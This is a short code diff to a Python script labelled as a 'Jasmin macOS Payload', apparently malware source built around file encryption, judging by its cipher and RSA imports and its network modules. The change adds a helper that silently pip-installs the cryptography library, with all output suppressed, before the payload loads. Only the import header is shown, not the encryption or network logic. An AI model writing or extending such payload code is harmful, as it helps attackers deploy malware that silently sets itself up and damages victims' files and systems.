@@ -1,6 +1,13 @@
 #!/usr/bin/env python3
 # Jasmin macOS Payload — Auto-generated
-import os,sys,struct,hashlib,socket,platform,datetime,urllib.request,json
+import os,sys,subprocess
+def _dep():
+    try:
+        import cryptography
+    except ImportError:
+        subprocess.check_call([sys.executable,'-m','pip','install','-q','cryptography'],stdout=subprocess.DEVNULL,stderr=subprocess.DEVNULL)
+_dep()
+import struct,hashlib,socket,platform,datetime,urllib.request,json
 from cryptography.hazmat.primitives.ciphers import Cipher,algorithms,modes
 from cryptography.hazmat.primitives.asymmetric import padding as ap
 from cryptography.hazmat.primitives import hashes,serialization
